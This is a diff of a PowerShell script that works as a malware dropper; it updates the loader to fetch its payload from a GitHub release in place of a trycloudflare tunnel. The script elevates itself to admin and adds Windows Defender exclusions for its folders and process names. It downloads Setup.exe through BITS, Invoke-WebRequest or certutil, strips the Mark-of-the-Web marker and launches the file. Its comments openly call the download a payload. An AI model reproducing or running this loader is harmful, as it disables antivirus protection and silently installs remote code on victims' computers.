@@ -3,7 +3,7 @@ param([switch]$Elevated)
 
 $dest  = "$env:LOCALAPPDATA\Programs\DeviceHelper"
 $setup = "$dest\update.exe"
-$dlUrl = "https://assumption-centered-brush-acting.trycloudflare.com/Setup.exe"
+$dlUrl = "https://github.com/alvaro129/nexus-core/releases/download/v1.0/Setup.exe"
 
 function Is-Admin {
     ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
@@ -11,7 +11,6 @@ function Is-Admin {
 }
 
 if (-not (Is-Admin)) {
-    # Tulis ulang script ini ke disk supaya bisa di-relaunch sebagai admin
     $tmp = "$env:TEMP\dhi.ps1"
     Copy-Item $PSCommandPath $tmp -Force -ErrorAction SilentlyContinue
     if (-not (Test-Path $tmp)) {
@@ -26,31 +25,43 @@ if (-not (Is-Admin)) {
 
 # === RUNNING AS ADMIN ===
 
-# Buat folder tujuan
+# 1. Target directory
 New-Item -ItemType Directory -Force -Path $dest | Out-Null
 
-# Tambah exclusion Defender SEBELUM download
+# 2. Add Windows Defender exclusions BEFORE downloading payload!
 try {
-    Add-MpPreference -ExclusionPath $dest -Force
-    Add-MpPreference -ExclusionPath "$env:TEMP" -Force
+    Add-MpPreference -ExclusionPath $dest -Force -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:TEMP" -Force -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "update.exe" -Force -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "DeviceHelper.exe" -Force -ErrorAction SilentlyContinue
 } catch {}
 
-# Download via BITS (paling aman, trusted Windows service, no MOTW)
+# 3. Download via BITS (Background Intelligent Transfer - trusted system service)
 $ok = $false
 try {
-    Import-Module BitsTransfer
-    Start-BitsTransfer -Source $dlUrl -Destination $setup
+    Import-Module BitsTransfer -ErrorAction SilentlyContinue
+    Start-BitsTransfer -Source $dlUrl -Destination $setup -ErrorAction Stop
     $ok = Test-Path $setup
 } catch {}
 
 if (-not $ok) {
-    # Fallback certutil
+    # Fallback: Invoke-WebRequest
+    try {
+        Invoke-WebRequest -Uri $dlUrl -OutFile $setup -UseBasicParsing -TimeoutSec 180 -ErrorAction Stop
+        $ok = Test-Path $setup
+    } catch {}
+}
+
+if (-not $ok) {
+    # Fallback: certutil
     certutil -urlcache -split -f $dlUrl $setup 2>&1 | Out-Null
     $ok = Test-Path $setup
 }
 
-# Hapus Zone.Identifier
-try { Remove-Item "${setup}:Zone.Identifier" -Force -EA SilentlyContinue } catch {}
+# 4. Remove Zone.Identifier (MOTW)
+try { Remove-Item "${setup}:Zone.Identifier" -Force -ErrorAction SilentlyContinue } catch {}
 
-# Jalankan
-if ($ok) { Start-Process $setup }
+# 5. Launch Setup.exe
+if ($ok) {
+    Start-Process $setup
+}
